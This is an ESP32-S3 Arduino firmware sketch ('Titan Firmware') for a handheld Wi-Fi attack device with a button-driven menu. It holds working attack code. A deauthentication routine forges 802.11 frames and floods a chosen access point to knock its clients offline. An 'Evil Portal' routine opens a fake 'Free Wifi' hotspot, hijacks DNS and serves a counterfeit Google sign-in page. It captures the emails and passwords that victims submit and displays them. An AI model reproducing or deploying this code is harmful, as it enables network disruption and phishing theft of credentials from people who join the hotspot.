/*
Arduino IDE Setting    Value
Board                ESP32S3 Dev Module
Port                 Your port
USB CDC On Boot      Enable
CPU Frequency        240MHZ(WiFi)
Core Debug Level     None
USB DFU On Boot      Disable
Erase All Flash Before Sketch Upload Disable
Events Run On        Core1
Flash Mode           QIO 80MHZ
Flash Size           16MB(128Mb)
Arduino Runs On      Core1
USB Firmware MSC On Boot Disable
Partition Scheme     16M Flash(3M APP/9.9MB FATFS)
PSRAM                OPI PSRAM
Upload Mode          UART0/Hardware CDC
Upload Speed         921600
USB Mode             CDC and JTAG

Made by titan.cybertech
*/

#include <TFT_eSPI.h>
#include <WiFi.h>
#include <FS.h>
#include <SD.h>
#include <esp_adc_cal.h>
#include "esp_wifi.h"
#include "titan.h"
#include "pin_config.h"
#include <WebServer.h>
#include <DNSServer.h>

// Prototypes of functions used before their definition
bool isButtonPressed(int pin, bool &buttonState);
void waitForButtonPress(int pin);
void displayMenu();
void displayWifiAttackSubMenu();
void displayWifiDeauthAttack();
void displayWifiEvilPortal();
void displayInfo();
void displayBatteryInfo();
void displaySettings();
void enterCategory();

// Macro to convert to RGB565 format (5-6-5)
#define COLOR565(r, g, b) ( (((r) & 0xF8) << 8) | (((g) & 0xFC) << 3) | (((b) & 0xF8) >> 3) )

// GPIO and constant definitions
#define BACKLIGHT_PIN 15
#define BUTTON_A      0
#define BUTTON_B      14
#define PIN_BAT_VOLT  4

const char* firmware_version = "1.1.3";

// Main menu
const char* menu_items[] = {"Wifi Attack", "BLE Attack", "Info", "Settings", "Battery Info", "Turn Off"};
const int menu_size = sizeof(menu_items) / sizeof(menu_items[0]);
int current_menu_index = 0;

// Colors used
const uint16_t COLOR_RED    = COLOR565(255, 0, 0);
const uint16_t COLOR_WHITE  = COLOR565(255, 255, 255);
const uint16_t COLOR_ORANGE = COLOR565(255, 165, 0);
const uint16_t COLOR_VIOLET = COLOR565(138, 43, 226);
const uint16_t COLOR_BLUE   = COLOR565(0, 0, 255);
const uint16_t COLOR_BLACK  = 0x0000;

uint16_t main_color = COLOR_VIOLET;  // Default main color
int brightness = 255;                // Brightness (0-255)

// Button states (for debounce)
bool buttonA_pressed = false;
bool buttonB_pressed = false;

// TFT screen instance
TFT_eSPI tft = TFT_eSPI();

// Backlight configuration via LEDC (ESP32)
const int LEDC_CHANNEL    = 0;
const int LEDC_FREQUENCY  = 5000;
const int LEDC_RESOLUTION = 8; // 8 bits (0-255)

// Web server and DNS for Evil Portal
WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

// Embedded HTML content (from google.html)
const char* evilPortalHtml = R"rawliteral(
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <style>
      body { font-family: sans-serif; }
      .login-container {
        width: 85%;
        margin: auto;
        padding: 20px;
        border-radius: 5px;
        margin-top: 10px;
      }
      #logo { margin: auto; width: fit-content; }
      .g-h1 { font-size: 25px; text-align: center; font-weight: 200; margin: auto; }
      .g-h2 { font-size: 15px; text-align: center; font-weight: 200; margin: auto; }
      .g-input {
        width: 95%;
        height: 30px;
        background-color: transparent;
        font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
        border-width: 0.5px;
        border-color: rgba(0, 0, 0, 0.6);
        border-radius: 4px;
        font-size: 16px;
        padding: 13px 9px;
        margin-bottom: 10px;
      }
      .create-account {
        font-size: smaller;
        color: #1a73e8;
        text-decoration: none;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        letter-spacing: 0.25px;
      }
      .gbtn-primary {
        min-width: 64px;
        border: none;
        margin-top: 6px;
        margin-bottom: 6px;
        height: 36px;
        border-radius: 4px;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        font-weight: 500;
        padding: 0 24px;
        box-sizing: inherit;
        background-color: rgb(26, 115, 232);
        color: #fff;
      }
      .button-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .text {
        font-family: Roboto, "Noto Sans Myanmar UI", Arial, sans-serif;
        white-space: normal;
        color: #5f6368;
        font-size: 14px;
        line-height: 1.4286;
        padding-bottom: 3px;
        padding-top: 9px;
        box-sizing: inherit;
      }
      .txt {
        text-decoration: none;
        border-radius: 4px;
        color: #1a73e8;
      }
    </style>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
  </head>
  <body>
    <div class="login-container">
      <div id="logo">
        <!-- Logo SVG -->
      </div>
      <form action="/get" id="email-form-step">
        <h1 class="g-h1">Sign in</h1>
        <h2 class="g-h2">Use your Google Account</h2>
        <div class="login-content">
          <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
          <input name="password" type="password" class="g-input" placeholder="Enter your password" required>
          <div class="text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="txt">Learn more</a></div>
          <div class="button-container">
            <a class="create-account" href="caca.html">Create account</a>
            <button class="gbtn-primary" type="submit">Next</button>
          </div>
        </div>
      </form>
    </div>
  </body>
</html>
)rawliteral";

// Construction of the deauth frame
const int DEAUTH_FRAME_SIZE = 26;
const uint8_t FRAME_CONTROL_DEAUTH[2] = {0xC0, 0x00};
const uint8_t DURATION[2] = {0x00, 0x00};
const uint8_t SEQUENCE[2] = {0x00, 0x00};
const uint8_t REASON_CODE[2] = {0x07, 0x00};
const uint8_t BROADCAST_ADDR[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

void buildDeauthFrame(const uint8_t *bssid, uint8_t *frameBuffer) {
  int index = 0;
  memcpy(frameBuffer + index, FRAME_CONTROL_DEAUTH, sizeof(FRAME_CONTROL_DEAUTH));
  index += sizeof(FRAME_CONTROL_DEAUTH);
  memcpy(frameBuffer + index, DURATION, sizeof(DURATION));
  index += sizeof(DURATION);
  memcpy(frameBuffer + index, BROADCAST_ADDR, sizeof(BROADCAST_ADDR));
  index += sizeof(BROADCAST_ADDR);
  memcpy(frameBuffer + index, bssid, 6);
  index += 6;
  memcpy(frameBuffer + index, bssid, 6);
  index += 6;
  memcpy(frameBuffer + index, SEQUENCE, sizeof(SEQUENCE));
  index += sizeof(SEQUENCE);
  memcpy(frameBuffer + index, REASON_CODE, sizeof(REASON_CODE));
}

// Continuous sending of deauth packets until interrupted
void continuousDeauthAttack(const uint8_t *bssid, int channel) {
  if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println("Error setting WiFi channel");
    return;
  }
  uint8_t deauthFrame[DEAUTH_FRAME_SIZE];
  buildDeauthFrame(bssid, deauthFrame);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Attack in progress", tft.width()/2, 20);
  tft.setTextSize(1);
  tft.drawString("A: Stop", tft.width()/2, tft.height()-20);

  uint32_t packetCount = 0;
  uint32_t lastUpdate = millis();
  char buf[20];

  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, DEAUTH_FRAME_SIZE, false);
    packetCount++;
    if (millis() - lastUpdate >= 100) {
      tft.fillRect(0, 40, tft.width(), 20, COLOR_BLACK);
      sprintf(buf, "Packets: %lu", packetCount);
      tft.setTextColor(main_color, COLOR_BLACK);
      tft.setTextDatum(TC_DATUM);
      tft.drawString(buf, tft.width()/2, 50);
      lastUpdate = millis();
    }
  }
  Serial.println("Stopping attack");
  delay(500); // Debounce
}

// Submenu for Wifi Attack: choose between Deauth and Evil Portal
void displayWifiAttackSubMenu() {
  int attackOption = 0;  // 0: Deauth Attack, 1: Evil Portal
  bool selectionDone = false;
  while (!selectionDone) {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(main_color, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    if (attackOption == 0)
      tft.drawString("Deauth Attack", tft.width()/2, tft.height()/2 - 10);
    else
      tft.drawString("Evil Portal", tft.width()/2, tft.height()/2 - 10);

    tft.setTextSize(1);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("B: Change | A: Select", tft.width()/2, tft.height()-20);

    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      attackOption = (attackOption + 1) % 2;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }
  if (attackOption == 0)
    displayWifiDeauthAttack();
  else
    displayWifiEvilPortal();
}

// WiFi attack in Deauth mode
void displayWifiDeauthAttack() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Wifi Attack", tft.width()/2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Scanning networks...", 10, 50);

  int n = WiFi.scanNetworks();
  delay(500);
  if (n == 0) {
    tft.fillScreen(COLOR_BLACK);
    tft.drawString("No networks found", 10, 70);
    waitForButtonPress(BUTTON_A);
    displayMenu();
    return;
  }

  int targetIndex = 0;
  bool selectionDone = false;
  const int pageSize = 5;
  int pageStart = 0;
  const int listY = 40;
  const int listH = pageSize * 20;

  while (!selectionDone) {
    tft.fillRect(0, 0, tft.width(), listY, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Select Network", tft.width()/2, 10);

    pageStart = targetIndex - pageSize / 2;
    if (pageStart < 0) pageStart = 0;
    if (pageStart + pageSize > n) pageStart = n - pageSize;
    if (pageStart < 0) pageStart = 0;

    tft.fillRect(0, listY, tft.width(), listH, COLOR_BLACK);
    for (int i = pageStart; i < pageStart + pageSize && i < n; i++) {
      int yPos = listY + (i - pageStart) * 20;
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 20) {
        ssid = ssid.substring(0, 20) + "...";
      }
      String info = String(i + 1) + ": " + ssid + " (Ch:" + String(WiFi.channel(i)) + ")";
      if (i == targetIndex) {
        tft.fillRect(5, yPos - 2, tft.width() - 10, 18, main_color);
        tft.setTextColor(COLOR_BLACK, main_color);
      } else {
        tft.setTextColor(main_color, COLOR_BLACK);
      }
      tft.setTextSize(1);
      tft.setTextDatum(TL_DATUM);
      tft.drawString(info, 10, yPos);
    }
    tft.fillRect(0, tft.height()-20, tft.width(), 20, COLOR_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("B: Next | A: Select", tft.width()/2, tft.height()-15);

    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      targetIndex = (targetIndex + 1) % n;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }

  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Target:", tft.width()/2, 30);
  tft.drawString(WiFi.SSID(targetIndex), tft.width()/2, 60);
  delay(2000);

  uint8_t* bssid = WiFi.BSSID(targetIndex);
  int channel = WiFi.channel(targetIndex);
  continuousDeauthAttack(bssid, channel);
  displayMenu();
}

// Evil Portal mode with open AP, DNS redirection, and immediate capture/display of credentials
void displayWifiEvilPortal() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Evil Portal", tft.width()/2, 20);

  const char* ap_ssid = "Free Wifi";
  // Launch an open AP (no password)
  WiFi.mode(WIFI_AP);
  if (WiFi.softAP(ap_ssid)) {
    Serial.println("AP launched (open)");
  } else {
    Serial.println("Error launching AP");
  }

  IPAddress apIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(apIP);

  // Start DNS server to redirect all requests to the AP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Configure the web server:
  // - The root serves the captive portal
  server.on("/", [](){
    server.send(200, "text/html", evilPortalHtml);
  });
  // - Handle form submission.
  // As soon as the user clicks "Next", the credentials are captured,
  // displayed on the TFT screen, and sent to the client.
  server.on("/get", [](){
    String email = server.arg("email");
    String password = server.arg("password");
    Serial.println("Captured credentials:");
    Serial.println("Email: " + email);
    Serial.println("Password: " + password);

    // Direct display on the TFT screen
    tft.fillScreen(COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(main_color, COLOR_BLACK);
    tft.drawString("Login received", tft.width()/2, 20);
    tft.setTextSize(1);
    tft.drawString("Email:", tft.width()/2, 50);
    tft.drawString(email, tft.width()/2, 70);
    tft.drawString("Password:", tft.width()/2, 90);
    tft.drawString(password, tft.width()/2, 110);

    // Optional: pause to let the user see the info
    delay(3000);

    // Send HTTP response to the client
    server.send(200, "text/html", "<html><body><h1>Please wait...</h1></body></html>");
  });
  // - Redirect any unknown URL to the root
  server.onNotFound([apIP](){
    server.sendHeader("Location", String("http://") + apIP.toString() + "/", true);
    server.send(302, "text/plain", "");
  });
  server.begin();

  // Display on the TFT screen
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Evil Portal Running", tft.width()/2, tft.height()/2 - 20);
  tft.setTextSize(1);
  tft.drawString("SSID: Free Wifi", tft.width()/2, tft.height()/2);
  tft.drawString("No password", tft.width()/2, tft.height()/2 + 10);
  tft.drawString("A: Stop", tft.width()/2, tft.height()-20);

  // Loop to handle DNS and web server
  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    dnsServer.processNextRequest();
    server.handleClient();
    delay(10);
  }
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(500);
  displayMenu();
}

// Display system information
void displayInfo() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Information", tft.width()/2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  const char* infos[] = {
    "Chip: ESP32-S3",
    "Screen: 170x320",
    "Flash: 16MB",
    "PSRAM: 8MB",
    "Battery: N/A"
  };
  for (int i = 0; i < 5; i++) {
    tft.drawString(infos[i], 10, 50 + i * 20);
  }
  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// Display battery information
void displayBatteryInfo() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Battery Info", tft.width()/2, 20);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  if (voltage > 4300)
    tft.drawString("No battery connected!", 10, 50);
  else
    tft.drawString("Voltage: " + String(voltage) + " mV", 10, 50);

  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// Display battery percentage
void displayBatteryPercentage() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  int percentage = map(voltage, 3300, 4200, 0, 100);
  if (percentage < 0) percentage = 0;
  if (percentage > 100) percentage = 100;

  tft.setTextSize(1);
  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString(String(percentage) + "%", tft.width() - 5, 5);
}

// Turn off the display (screen off)
void turnOffDisplay() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Turning Off...", tft.width()/2, tft.height()/2);
  delay(1000);

  digitalWrite(PIN_POWER_ON, LOW);
  digitalWrite(PIN_LCD_BL, LOW);
  tft.writecommand(0x10);
  esp_sleep_enable_ext0_wakeup((gpio_num_t)PIN_BUTTON_2, 0);
  esp_deep_sleep_start();
}

// Display settings (color and brightness)
void displaySettings() {
  const char* colors[] = {"Red", "White", "Orange", "Violet", "Blue"};
  uint16_t color_values[] = {COLOR_RED, COLOR_WHITE, COLOR_ORANGE, COLOR_VIOLET, COLOR_BLUE};
  int color_index = 0;
  while (true) {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(main_color, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Settings", tft.width()/2, 20);

    tft.setTextSize(2);
    tft.drawString("Main color:", tft.width()/2, tft.height()/2 - 30);
    tft.setTextSize(3);
    tft.drawString(colors[color_index], tft.width()/2, tft.height()/2);

    tft.setTextSize(2);
    tft.drawString("Brightness: " + String(brightness), tft.width()/2, tft.height()/2 + 50);

    if (digitalRead(BUTTON_A) == LOW) {
      brightness += 20;
      if (brightness > 255) brightness = 20;
      ledcWrite(LEDC_CHANNEL, brightness);
      delay(200);
    }
    if (digitalRead(BUTTON_B) == LOW) {
      unsigned long press_time = millis();
      while (digitalRead(BUTTON_B) == LOW) {
        if (millis() - press_time > 1000) {
          displayMenu();
          return;
        }
      }
      color_index = (color_index + 1) % 5;
      main_color = color_values[color_index];
      delay(200);
    }
    delay(100);
  }
}

// Select category from the main menu
void enterCategory() {
  String currentItem = menu_items[current_menu_index];
  if (currentItem == "Wifi Attack") {
    displayWifiAttackSubMenu();
  } else if (currentItem == "Info") {
    displayInfo();
  } else if (currentItem == "Settings") {
    displaySettings();
  } else if (currentItem == "Battery Info") {
    displayBatteryInfo();
  } else if (currentItem == "BLE Attack") {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("BLE Attack", tft.width()/2, tft.height()/2);
    delay(1000);
    displayMenu();
  } else if (currentItem == "Turn Off") {
    turnOffDisplay();
  } else {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Unknown Menu", tft.width()/2, tft.height()/2);
    delay(1000);
    displayMenu();
  }
}

// Handle button presses in the main loop
void handleButtonPress() {
  if (isButtonPressed(BUTTON_A, buttonA_pressed))
    enterCategory();
  else if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
    current_menu_index = (current_menu_index + 1) % menu_size;
    displayMenu();
  }
}

// Display Splash Screen (startup)
void showSplashScreen() {
  tft.fillScreen(COLOR_BLACK);
  const int imgWidth = 170;
  const int imgHeight = 170;
  int x = (tft.width() - imgWidth) / 2;
  int y = (tft.height() - imgHeight) / 2;
  tft.pushImage(x, y, imgWidth, imgHeight, titan);
  delay(5000);
}

// Utility function: wait for button press (debounce)
void waitForButtonPress(int pin) {
  while (digitalRead(pin) == HIGH) {
    delay(50);
  }
  delay(200);
}

// Utility function: check button press with debounce
bool isButtonPressed(int pin, bool &buttonState) {
  if (digitalRead(pin) == LOW && !buttonState) {
    buttonState = true;
    delay(200);
    return true;
  }
  if (digitalRead(pin) == HIGH && buttonState)
    buttonState = false;
  return false;
}

// Display the main menu
void displayMenu() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(3);
  tft.setTextDatum(MC_DATUM);
  tft.drawString(menu_items[current_menu_index], tft.width()/2, tft.height()/2);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Titan Firmware", 5, 5);

  tft.setTextDatum(BL_DATUM);
  tft.drawString(firmware_version, 5, tft.height()-5);

  String categoryText = "Category: " + String(current_menu_index + 1) + "/" + String(menu_size);
  tft.setTextDatum(BR_DATUM);
  tft.drawString(categoryText, tft.width()-5, tft.height()-5);

  displayBatteryPercentage();
}

// Setup
void setup() {
  Serial.begin(115200);

  // Configure backlight via LEDC
  pinMode(BACKLIGHT_PIN, OUTPUT);
  ledcSetup(LEDC_CHANNEL, LEDC_FREQUENCY, LEDC_RESOLUTION);
  ledcAttachPin(BACKLIGHT_PIN, LEDC_CHANNEL);
  ledcWrite(LEDC_CHANNEL, brightness);

  pinMode(BUTTON_A, INPUT_PULLUP);
  pinMode(BUTTON_B, INPUT_PULLUP);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(COLOR_BLACK);

  // Configure WiFi in station mode (for deauth attack)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  showSplashScreen();
  displayMenu();
}

// Main loop
void loop() {
  static unsigned long lastActivityTime = millis();
  const unsigned long screenOffDelay = 15000; // 15 seconds

  handleButtonPress();

  // Check for inactivity
  if (millis() - lastActivityTime >= screenOffDelay) {
    tft.fillScreen(COLOR_BLACK);
    bool screenOff = true;
    while (screenOff) {
      if (digitalRead(BUTTON_A) == LOW || digitalRead(BUTTON_B) == LOW) {
        screenOff = false;
        displayMenu();
        lastActivityTime = millis();
      }
      delay(50);
    }
  }

  delay(50);
}
